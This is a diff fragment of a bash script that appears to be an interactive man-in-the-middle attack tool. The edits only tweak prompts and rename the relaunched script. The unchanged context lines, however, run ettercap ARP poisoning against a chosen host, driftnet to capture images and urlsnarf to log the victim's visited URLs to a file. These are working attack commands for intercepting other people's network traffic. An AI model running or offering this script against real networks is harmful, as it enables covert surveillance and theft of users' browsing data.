@@ -91,7 +91,7 @@ if [ "$v0" = y ] ;
 fi    
     echo
     echo "Enter the network interface used"
-    echo -n ">>" ;read int
+    echo -n ">> " ;read int
     echo "------------------------------------------"
      echo -n "Insert target host, y/n? "
      read V
@@ -105,18 +105,20 @@ if [[ "$V" = y ]]; then
     xterm -e ./target.sh&
     xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
     urlsnarf -i $int | grep $alvo > log.txt
+
 elif [[ "$V" = n ]]; then
     driftnet -i $int&
     xterm -e ./target.sh&
     xterm -e ettercap -T -q -i $int -M arp:remote /$IP//&
     urlsnarf -i $int > log.txt
+
 else
   echo "------------------------------------------"
   echo "Unknown entry, run the script again. y/n?"
-  echo -n ">>" ; read v1
-  if [[ "$v1" = s ]]; then
-    ./mitm.sh
-  else
-    exit
+  echo -n ">> " ; read v1
+  if [[ "$v1" = y ]]; then
+    ./movnet.sh
+else
+  exit
 fi
 fi
